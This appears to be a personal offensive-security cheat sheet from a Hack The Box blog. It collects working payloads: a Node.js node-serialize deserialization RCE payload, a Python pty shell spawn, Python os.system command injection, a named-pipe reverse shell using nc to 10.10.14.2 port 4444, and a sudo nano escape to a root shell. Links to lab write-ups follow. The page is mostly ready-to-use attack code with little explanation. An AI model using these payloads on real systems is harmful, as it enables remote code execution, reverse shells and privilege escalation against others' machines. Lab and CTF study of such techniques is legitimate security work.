---
title: "Highlights"
date: 2020-01-03T20:06:24-05:00
draft: false
description: "Node.js deserialization exploit | Fully Interactive TTY | Nano Escape | Python RCE"
---

# Node.js deserialization exploit  

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  

```js
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec  
('uname -a', function(error, stdout, stderr)  
{ console.log(stdout) });  \n }  
()"}  
```  


In this case the () is javascripts way of immediate function invokation, the first part of the code will build the function. 

# Spawn Fully Interactive TTY
```bash
$ /bin/bash # drop out of zsh b/c not compatible
# get initial terminal session
$ ctrl-z
$ stty raw -echo # - indicates disabling the stopping of the echo
$ fg 
$ reset
```

# Shell Spawn Python

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
# Python Command Injection

```python
__import__("os"); os.system("pwd")
```

# Python code injection w/import and backpiping

```bash
__import__("os").system("mknod /tmp/backpipe2 p && /bin/sh 0</tmp/backpipe2 | nc 10.10.14.2 4444 1>/tmp/backpipe2")
```

# Nano Escape

Opening nano as sudo we can then perform:
```bash
^R^X
Reset; sh 1>&0 2>&0
```
_Where ^R^X is ctrl+R and ctrl+X._

# HTB Writeups
[OpenAdmin](../../post/htb/openadmin)
[Postman](../../post/htb/postman)
[Craft](../../post/htb/craft)
[Sneaky - Coming Soon](../../post/htb/sneaky)
[Traverxec - Coming Soon](../../post/htb/traverxec)

![test image](/img/craft/developer.png)